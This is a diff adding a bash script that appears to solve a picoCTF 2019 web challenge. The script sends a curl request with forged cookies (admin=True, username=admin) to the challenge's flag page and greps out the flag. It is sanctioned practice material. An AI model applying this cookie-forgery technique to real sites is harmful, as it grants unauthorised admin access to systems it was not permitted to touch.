@@ -1,0 +1,3 @@
+#! /bin/bash
+
+curl -s 'https://2019shell1.picoctf.com/problem/49907/flag' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:74.0) Gecko/20100101 Firefox/74.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Referer: https://2019shell1.picoctf.com/problem/49907/' -H 'Connection: keep-alive' -H 'Cookie: _ga=GA1.2.66707134.1585330600; _gid=GA1.2.643276600.1586280220; password=admen; username=admin; admin=True' -H 'Upgrade-Insecure-Requests: 1' -H 'Cache-Control: max-age=0' | grep -oE "picoCTF{.*?}" --color=none
